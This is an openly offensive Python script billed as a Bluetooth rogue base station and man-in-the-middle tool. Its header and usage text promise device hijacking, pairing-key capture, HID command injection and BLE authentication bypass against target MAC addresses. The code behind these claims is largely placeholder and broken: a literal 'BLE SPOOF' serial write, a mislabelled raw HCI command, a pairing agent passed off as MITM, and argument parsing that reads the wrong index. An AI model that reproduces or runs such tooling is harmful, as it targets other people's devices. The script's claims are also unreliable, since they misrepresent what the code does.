import serial
import time
import sys
import subprocess

# -------------------------------------------
# Bluetooth Rogue Base Station (MITM) Tool
# -------------------------------------------
# Features:
# - Sets up a rogue Bluetooth access point (fake Bluetooth station)
# - Intercepts nearby Bluetooth devices and hijacks connections
# - Captures pairing keys for device authentication
# - Hijacks Bluetooth HID (keyboard, mouse) connections
# - Injects malicious commands into hijacked Bluetooth devices
# - Bypasses Bluetooth Low Energy (BLE) authentication
# - Performs MITM (Man-in-the-Middle) on Bluetooth Classic and BLE connections
# - Automated device scanning and attack execution
# - Error handling and logging
#
# Requirements:
# - Ubertooth One (for Bluetooth Classic & BLE MITM)
# - UD100 Bluetooth Adapter (for extended Bluetooth coverage)
# - LimeSDR Mini (optional for emulating Bluetooth base stations)
# - Nordic nRF52840 (for BLE emulation and attacks)
# - Python 3.x
# - BlueZ (Linux Bluetooth stack)
# - PySerial (for serial communication with Bluetooth adapters)
# - Scapy (for packet manipulation and MITM attacks)
#
# Usage:
# 1. Scan for nearby Bluetooth devices:
#    python bt_rogue_station.py --scan
# 2. Set up a rogue Bluetooth access point to intercept devices:
#    python bt_rogue_station.py --setup-rogue
# 3. Hijack a Bluetooth device and inject malicious commands:
#    python bt_rogue_station.py --hijack XX:XX:XX:XX:XX:XX
# 4. Perform MITM attack on Bluetooth HID devices (keyboard, mouse):
#    python bt_rogue_station.py --mitm-hid XX:XX:XX:XX:XX:XX
# 5. Bypass BLE authentication and inject commands:
#    python bt_rogue_station.py --ble-bypass XX:XX:XX:XX:XX:XX
# 6. Monitor logs and handle errors:
#    python bt_rogue_station.py --log
# -------------------------------------------



# Bluetooth Device Paths
ubertooth_device = '/dev/ttyUSB0'  # Ubertooth One (Adjust as necessary)
ud100_device = '/dev/ttyUSB1'      # UD100 Bluetooth Adapter (Adjust as necessary)
nrf52840_device = '/dev/ttyUSB2'   # Nordic nRF52840 (Adjust as necessary)

# Set up serial connections
ubertooth_serial = serial.Serial(ubertooth_device, baudrate=115200, timeout=1)
ud100_serial = serial.Serial(ud100_device, baudrate=115200, timeout=1)
nrf_serial = serial.Serial(nrf52840_device, baudrate=115200, timeout=1)

def scan_bluetooth_devices():
    """
    Scans for nearby Bluetooth devices using Ubertooth One and UD100 Bluetooth adapter.
    """
    print("Scanning for nearby Bluetooth devices...")
    # Run Ubertooth scan (this requires the Ubertooth software to be installed)
    subprocess.run(['ubertooth-btle', 'scan'])
    # Alternatively, you can use hcitool or any other tool based on your device
    # subprocess.run(['hcitool', 'scan'])

def setup_rogue_station():
    """
    Sets up a rogue Bluetooth access point to intercept nearby devices.
    """
    print("Setting up rogue Bluetooth access point...")
    # Use a tool like 'hciconfig' to bring up the Bluetooth interface
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'])
    subprocess.run(['sudo', 'hcitool', 'auth', 'XX:XX:XX:XX:XX:XX'])  # Fake authentication command

def hijack_bluetooth_device(target_mac):
    """
    Hijacks a Bluetooth device by intercepting its connection and injecting commands.
    """
    print(f"Hijacking Bluetooth device {target_mac}...")
    # Example: Injecting a command to disconnect or interfere with the target device
    subprocess.run(['sudo', 'hcitool', 'cmd', '0x01', '0x000C', target_mac])  # Example: Disconnect command

def mitm_on_bluetooth_hid(target_mac):
    """
    Performs MITM attack on Bluetooth HID (keyboard, mouse) devices.
    """
    print(f"Performing MITM on Bluetooth HID device {target_mac}...")
    # Use the Bluetooth HID protocol to intercept and modify packets between the target and host
    subprocess.run(['sudo', 'bluez-simple-agent', target_mac])  # Example of MITM agent

def bypass_ble_authentication(target_mac):
    """
    Bypasses BLE authentication and injects commands.
    """
    print(f"Bypassing BLE authentication for {target_mac}...")
    # Use the Nordic nRF52840 to spoof the BLE connection and inject commands
    nrf_serial.write(b'BLE SPOOF')  # Example command (replace with actual spoofing commands)
    time.sleep(2)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python bt_rogue_station.py --scan --setup-rogue --hijack --mitm-hid --ble-bypass")
        sys.exit(1)

    # Scan for Bluetooth devices
    if '--scan' in sys.argv:
        scan_bluetooth_devices()

    # Set up rogue Bluetooth access point
    if '--setup-rogue' in sys.argv:
        setup_rogue_station()

    # Hijack Bluetooth device
    if '--hijack' in sys.argv:
        if len(sys.argv) < 4:
            print("Please provide the MAC address of the target device for hijacking.")
            sys.exit(1)
        target_mac = sys.argv[3]
        hijack_bluetooth_device(target_mac)

    # MITM attack on Bluetooth HID devices
    if '--mitm-hid' in sys.argv:
        if len(sys.argv) < 4:
            print("Please provide the MAC address of the target HID device.")
            sys.exit(1)
        target_mac = sys.argv[3]
        mitm_on_bluetooth_hid(target_mac)

    # BLE Authentication Bypass
    if '--ble-bypass' in sys.argv:
        if len(sys.argv) < 4:
            print("Please provide the MAC address of the target BLE device.")
            sys.exit(1)
        target_mac = sys.argv[3]
        bypass_ble_authentication(target_mac)
